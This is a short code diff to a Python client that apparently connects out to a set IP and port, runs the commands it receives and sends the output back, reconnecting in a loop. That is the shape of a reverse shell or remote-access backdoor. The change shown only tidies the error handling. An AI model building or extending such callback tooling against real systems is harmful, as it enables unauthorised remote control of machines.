@@ -224,11 +224,8 @@ def listen(c):
                 if not output:
                     output = b"[+] Command executed (No output)\n"
                 enviar_dados_estruturados(c, output)
-        except RuntimeError as e_run:
-            print(f"[-] Protocol state error: {e_run}")
-            break
-        except OSError as e_os:
-            print(f"[-] Socket state error: {e_os}")
+        except (RuntimeError, OSError) as e_err:
+            print(f"[-] Connection or state error: {e_err}")
             break
 
 def main():
@@ -237,10 +234,7 @@ def main():
         c = connect(IP, PORT)
         if c:
             listen(c)
-            try:
-                c.close()
-            except OSError:
-                pass
+            c.close()
         sleep(5)
 
 if __name__ == "__main__":
